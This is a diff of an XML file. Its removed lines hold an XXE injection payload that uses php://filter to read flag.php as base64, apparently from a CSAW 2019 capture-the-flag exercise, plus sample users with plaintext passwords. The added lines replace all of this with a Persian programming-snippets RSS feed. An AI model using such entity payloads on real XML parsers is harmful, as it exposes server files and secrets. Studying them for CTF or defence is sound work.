@@ -1,32 +1,279 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE foo[
-<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
-]>
-<userInfo>
-<firstName>John</firstName>
-<lastName>&xxe;</lastName>
-</userInfo>
-<payload>
-    <toptext>&xxe;</toptext>
-</payload>
-<users>
-  <user>
-    <username>alice</username>
-    <password>passwd1</password>
-    <name>Alice</name>
-    <email>alice@fakesite.com</email>
-    <group>CSAW2019</group>
-  </user>
-  <user>
-    <username>bob</username>
-    <password>passwd2</password>
-    <name> Bob</name>
-    <email>bob@fakesite.com</email>
-    <group>CSAW2019</group>
-  </user>
-</users>                                                             
-<message>
-<id>2</id>
-<message>msg</message>
-<title>xml</title>
-</message>
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Snippets</title>
+	<atom:link href="http://snippets.ir/feed" rel="self" type="application/rss+xml" />
+	<link>http://snippets.ir</link>
+	<description>یک دنیا کد</description>
+	<lastBuildDate>Wed, 22 Jul 2020 07:22:42 +0000</lastBuildDate>
+	<language>fa-IR</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+		<item>
+		<title>فعالسازی امن و استاندارد حالت دیباگ در پی.اچ.پی</title>
+		<link>http://snippets.ir/1450/enable-secure-debug-mode-in-php.html</link>
+					<comments>http://snippets.ir/1450/enable-secure-debug-mode-in-php.html#respond</comments>
+		
+		<dc:creator><![CDATA[مهدی یوسفی]]></dc:creator>
+		<pubDate>Mon, 20 Jul 2020 07:23:43 +0000</pubDate>
+				<category><![CDATA[PHP]]></category>
+		<category><![CDATA[debug]]></category>
+		<category><![CDATA[debugging]]></category>
+		<category><![CDATA[دیباگ]]></category>
+		<category><![CDATA[دیباگ استاندارد]]></category>
+		<category><![CDATA[دیباگ امن]]></category>
+		<category><![CDATA[دیباگ وردپرس]]></category>
+		<guid isPermaLink="false">http://snippets.ir/?p=1450</guid>
+
+					<description><![CDATA[<p>یکی از تفاوت‌هایی که زبان php با زبان‌های کامپایلری دارد این است که ممکن است در زمان خروجی گرفتن و سپس بارگذاری روی سرور تمامی باگ‌های آن را متوجه نشوید. این خاصیت زبان‌های مفسری است. به همین دلیل گاها در حالت production با خطایی روبرو می‌شوید که باید بدون بستن سایت بروی بازدید کننده‌ها، آن...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1450/enable-secure-debug-mode-in-php.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1450/enable-secure-debug-mode-in-php.html">فعالسازی امن و استاندارد حالت دیباگ در پی.اچ.پی</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1450/enable-secure-debug-mode-in-php.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>استفاده از رنگ gradient در status bar اندروید</title>
+
+					<description><![CDATA[<p>ممکن است بعضی وقت ها بخواهید رنگ status bar اپلیکیشن اندرویدی خود را تغییر دهید و به جای آن از یک رنگ gradient استفاده کنید. این کار جلوه ویژه ای به اپلیکیشن شما می بخشد. برای انجام این کار کافیست مراحل دو گانه زیر را انجام دهید. کد زیر را قبل از فراخوانی تابع setContentView()...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1434/use-gradiant-color-in-status-bar-android.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1434/use-gradiant-color-in-status-bar-android.html">استفاده از رنگ gradient در status bar اندروید</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1434/use-gradiant-color-in-status-bar-android.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>تغییر فیلدهای پیش فرض فرم ثبت نام ووکامرس</title>
+		<link>http://snippets.ir/1429/add-woocommerce-custom-fields-in-registration-form.html</link>
+					<comments>http://snippets.ir/1429/add-woocommerce-custom-fields-in-registration-form.html#comments</comments>
+		
+		<dc:creator><![CDATA[مهران شمالی]]></dc:creator>
+		<pubDate>Fri, 21 Jun 2019 07:24:05 +0000</pubDate>
+				<category><![CDATA[Woocommerce]]></category>
+		<category><![CDATA[اضافه کردن فیلد جدید]]></category>
+		<category><![CDATA[اضافه کردن فیلد جدید به ثبت نام ووکامرس]]></category>
+		<category><![CDATA[اضافه کردن فیلد جدید به فرم ثبت نام]]></category>
+		<category><![CDATA[فرم ثبت نام]]></category>
+		<category><![CDATA[ووکامرس]]></category>
+		<category><![CDATA[ووکامرس فارسی]]></category>
+		<guid isPermaLink="false">http://snippets.ir/?p=1429</guid>
+
+					<description><![CDATA[<p>به صورت پیشفرض فرم ثبت نام کاربر در ووکامرس، دو فیلد ایمیل و پسورد را جهت ثبت نام کاربر دریافت می‌کند. این فیلدها در اکثر فروشگاه‌ها اطلاعات کافی و مناسب برای ثبت نام کاربر نیست و لازم است که فیلدهای بیشتری نظیر نام، نام خانوادگی، شماره تلفن و &#8230; نیز از کاربر گرفته شود. برای...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1429/add-woocommerce-custom-fields-in-registration-form.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1429/add-woocommerce-custom-fields-in-registration-form.html">تغییر فیلدهای پیش فرض فرم ثبت نام ووکامرس</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1429/add-woocommerce-custom-fields-in-registration-form.html/feed</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>جلوگیری از بازنشانی صفحه در زمان ثبت فرم با جاوا اسکریپت</title>
+		<link>http://snippets.ir/1424/prevent-refresh-page-on-submit-javascript.html</link>
+					<comments>http://snippets.ir/1424/prevent-refresh-page-on-submit-javascript.html#respond</comments>
+		
+		<dc:creator><![CDATA[امیرمحمد ترکمن]]></dc:creator>
+		<pubDate>Tue, 30 Apr 2019 15:09:05 +0000</pubDate>
+				<category><![CDATA[HTML & Css]]></category>
+		<category><![CDATA[javascript]]></category>
+		<category><![CDATA[ajax]]></category>
+		<category><![CDATA[prevent refresh on submit]]></category>
+		<category><![CDATA[اجکس]]></category>
+		<category><![CDATA[جاوا اسکریپت]]></category>
+		<category><![CDATA[جاوااسکریپت]]></category>
+		<category><![CDATA[جلوگیری از بازنشانی صفحه در جاوااسکریپت]]></category>
+		<guid isPermaLink="false">http://snippets.ir/?p=1424</guid>
+
+					<description><![CDATA[<p>شاید برای شما هم اتفاق افتاده باشد که بخواهید فرمی را در جاوااسکریپت با استفاده از تکنولوژی ajax ارسال کنید ولی وقتی روی دکمه ارسال کلیک می کنید یا کلید اینتر را می زنید صفحه بازنشانی می شود و عملا ajax بی استفاده خواهد ماند. برای جلوگیری از این اتفاق شما می توانید از قطعه...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1424/prevent-refresh-page-on-submit-javascript.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1424/prevent-refresh-page-on-submit-javascript.html">جلوگیری از بازنشانی صفحه در زمان ثبت فرم با جاوا اسکریپت</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1424/prevent-refresh-page-on-submit-javascript.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>استفاده از دیتابیس Room در اندروید</title>
+		<link>http://snippets.ir/1418/use-room-database-in-android-java.html</link>
+					<comments>http://snippets.ir/1418/use-room-database-in-android-java.html#respond</comments>
+		
+		<dc:creator><![CDATA[امیرحسین ایرانمنش]]></dc:creator>
+		<pubDate>Thu, 18 Apr 2019 07:09:07 +0000</pubDate>
+				<category><![CDATA[Database]]></category>
+		<category><![CDATA[Java]]></category>
+		<category><![CDATA[SQlite]]></category>
+		<category><![CDATA[android]]></category>
+		<category><![CDATA[database]]></category>
+		<category><![CDATA[java]]></category>
+		<category><![CDATA[offline database]]></category>
+		<category><![CDATA[room database]]></category>
+		<category><![CDATA[اندروید]]></category>
+		<category><![CDATA[جاوا]]></category>
+		<category><![CDATA[دیتابیس]]></category>
+		<guid isPermaLink="false">http://snippets.ir/?p=1418</guid>
+
+					<description><![CDATA[<p>شاید شده باشه تا حالا با خودتون فکر کرده باشین چجوری میشه داخل اپ اندرویدی خودتون اطلاعات رو آفلاین ذخیره و استفاده کنین!؟ یا نیاز داشتین یک ساختار منسجم و مشخص برای ذخیره سازی اطلاعات کاربرتون داخل اپ داشته باشید. در این پست قصد داریم اموزش ساخت یک دیتابیس با یک Entity به نام User...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1418/use-room-database-in-android-java.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1418/use-room-database-in-android-java.html">استفاده از دیتابیس Room در اندروید</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1418/use-room-database-in-android-java.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>خواندن وروردی متد post در PHP</title>
+		<link>http://snippets.ir/1408/read-post-method-inputs-in-php.html</link>
+					<comments>http://snippets.ir/1408/read-post-method-inputs-in-php.html#respond</comments>
+		
+		<dc:creator><![CDATA[امیرمحمد ترکمن]]></dc:creator>
+		<pubDate>Sat, 23 Mar 2019 17:05:42 +0000</pubDate>
+				<category><![CDATA[PHP]]></category>
+		<category><![CDATA[php input]]></category>
+		<category><![CDATA[post method]]></category>
+		<category><![CDATA[read post method inputs]]></category>
+		<category><![CDATA[خواندن وروردی متد post در PHP]]></category>
+		<guid isPermaLink="false">http://snippets.ir/?p=1408</guid>
+
+					<description><![CDATA[<p>برای خواندن مقدار داخل body در متد post شما می‌توانید با استفاده از php://input یا متغیر سراسری POST_$ به آن دسترسی داشته باشید. تفاوت دو روش بالا در این است که اگر وروردی شما به صورت form data باشد از POST_$ استفاده می‌کنید و اگر ورودی شما به صورت raw data (یعنی به صورت json)...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1408/read-post-method-inputs-in-php.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1408/read-post-method-inputs-in-php.html">خواندن وروردی متد post در PHP</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1408/read-post-method-inputs-in-php.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>افزودن خودکار محصول به سبد خرید در ووکامرس</title>
+		<link>http://snippets.ir/1404/automatically-add-product-to-cart-on-visit-woocommerce.html</link>
+					<comments>http://snippets.ir/1404/automatically-add-product-to-cart-on-visit-woocommerce.html#comments</comments>
+		
+		<dc:creator><![CDATA[مهدی یوسفی]]></dc:creator>
+		<pubDate>Wed, 20 Mar 2019 19:23:59 +0000</pubDate>
+				<category><![CDATA[Woocommerce]]></category>
+		<category><![CDATA[Automatically add product to cart]]></category>
+		<category><![CDATA[woo]]></category>
+		<category><![CDATA[woocommerce]]></category>
+		<category><![CDATA[افزودن خودکار محصول به سبد خرید در ووکامرس]]></category>
+		<category><![CDATA[افزودن محصول به سبد خرید]]></category>
+		<category><![CDATA[سبد خرید]]></category>
+		<category><![CDATA[ووکامرس]]></category>
+		<guid isPermaLink="false">http://snippets.ir/?p=1404</guid>
+
+					<description><![CDATA[<p>اگر قصد دارید در زمانی که کاربر از سایت شما بازدید می‌کند بصورت خودکار یک محصول به سبد خریدش اضافه کنید می‌توانید از کد زیر استفاده کنید. این کد در هر بار بازدید کاربر از سایت سبد خرید را بررسی می‌کند، اگر محصول مورد نظر در سبد خریدش موجود نبود آن را به سبد خرید...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1404/automatically-add-product-to-cart-on-visit-woocommerce.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1404/automatically-add-product-to-cart-on-visit-woocommerce.html">افزودن خودکار محصول به سبد خرید در ووکامرس</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1404/automatically-add-product-to-cart-on-visit-woocommerce.html/feed</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>حل مشکل CORS در لاراول</title>
+		<link>http://snippets.ir/1395/solving-cors-problem-in-laravel.html</link>
+					<comments>http://snippets.ir/1395/solving-cors-problem-in-laravel.html#respond</comments>
+		
+		<dc:creator><![CDATA[مهران شمالی]]></dc:creator>
+		<pubDate>Tue, 12 Mar 2019 10:30:59 +0000</pubDate>
+				<category><![CDATA[Laravel]]></category>
+		<category><![CDATA[cors in laravel]]></category>
+		<category><![CDATA[cors problem in laravel]]></category>
+		<category><![CDATA[cors در لاراول]]></category>
+		<category><![CDATA[laravel]]></category>
+		<category><![CDATA[حل مشکل cors در لاراول]]></category>
+		<category><![CDATA[لاراول]]></category>
+		<category><![CDATA[مشکل cors در لاراول]]></category>
+		<guid isPermaLink="false">http://snippets.ir/?p=1395</guid>
+
+					<description><![CDATA[<p>اگر در لاراول برای frontend مثل فریم ورک‌های Vue و React و&#8230; API می‌نویسید احتمالا به مشکل CORS مرورگر برخورده اید. می‌خواهیم در این نوشته این مشکل را برای همیشه حل کنیم. در اینجا دو راه حل برای حل این مشکل ارائه می‌دهیم. راه حل اول نوشتن یک middleware است و راه حل دوم حل...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1395/solving-cors-problem-in-laravel.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1395/solving-cors-problem-in-laravel.html">حل مشکل CORS در لاراول</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1395/solving-cors-problem-in-laravel.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>خروجی اکسل از مدل ها در لاراول</title>
+		<link>http://snippets.ir/1176/export-laravel-models-to-excel.html</link>
+					<comments>http://snippets.ir/1176/export-laravel-models-to-excel.html#respond</comments>
+		
+		<dc:creator><![CDATA[مهران شمالی]]></dc:creator>
+		<pubDate>Sun, 10 Mar 2019 21:31:31 +0000</pubDate>
+				<category><![CDATA[Laravel]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[export to excel]]></category>
+		<category><![CDATA[laravel]]></category>
+		<category><![CDATA[خروجی از مدل ها]]></category>
+		<category><![CDATA[خروجی به excel]]></category>
+		<category><![CDATA[خروجی گرفتن از مدل ها]]></category>
+		<category><![CDATA[فریم ورک لاراول]]></category>
+		<category><![CDATA[لاراول]]></category>
+		<guid isPermaLink="false">http://snippets.ir/?p=1176</guid>
+
+					<description><![CDATA[<p>در این نوشته می‌خواهیم از اطلاعات مدل‌های موجود در پروژه با استفاده از بسته‌ای که معرفی خواهیم کرد به فرمت excel خروجی بگیریم. این عمل برای گزارش گیری بسیار مناسب است. برای این کار از بسته Laravel-Excel استفاده می‌کنیم. برای نصب این بسته از این لینک استفاده کنید. در مثال پایین فرض کنید که مدل...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1176/export-laravel-models-to-excel.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1176/export-laravel-models-to-excel.html">خروجی اکسل از مدل ها در لاراول</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1176/export-laravel-models-to-excel.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>تشخیص قدرت کلمه‌عبور با زبان جاوا</title>
+		<link>http://snippets.ir/1386/detect-password-strength-with-java.html</link>
+					<comments>http://snippets.ir/1386/detect-password-strength-with-java.html#respond</comments>
+		
+		<dc:creator><![CDATA[رضا غلامزاد]]></dc:creator>
+		<pubDate>Sat, 09 Mar 2019 16:56:36 +0000</pubDate>
+				<category><![CDATA[Java]]></category>
+		<category><![CDATA[java]]></category>
+		<category><![CDATA[Password Strength Checker]]></category>
+		<category><![CDATA[بررسی رمزعبور]]></category>
+		<category><![CDATA[بررسی گذرواژه]]></category>
+		<category><![CDATA[جاوا]]></category>
+		<category><![CDATA[رمزعبور]]></category>
+		<category><![CDATA[قدرت رمز عبور]]></category>
+		<category><![CDATA[قدرت گذرواژه]]></category>
+		<category><![CDATA[گذرواژه]]></category>
+		<guid isPermaLink="false">http://snippets.ir/?p=1386</guid>
+
+					<description><![CDATA[<p>شاید برای شما جذاب باشد که بدانید به چه روشی قدرت کلمه‌عبورهایی که شما در سایت‌ها وارد می‌کنید مورد ارزیابی قرار می‌گیرد. در قدرت کلمه‌عبور چندین ملاک از جمله طول کلمه‌عبور، داشتن حروف کوچک، حروف بزرگ، حروف خاص و عدد وجود دارد. در کد قرار داده شده ما شرط قوی بودن کلمه‌عبور را داشتن طول...</p>
+<p class="read-more"><a class="btn btn-default" href="http://snippets.ir/1386/detect-password-strength-with-java.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+<p>نوشته <a rel="nofollow" href="http://snippets.ir/1386/detect-password-strength-with-java.html">تشخیص قدرت کلمه‌عبور با زبان جاوا</a> اولین بار در <a rel="nofollow" href="http://snippets.ir">Snippets</a> پدیدار شد.</p>
+]]></description>
+		
+					<wfw:commentRss>http://snippets.ir/1386/detect-password-strength-with-java.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
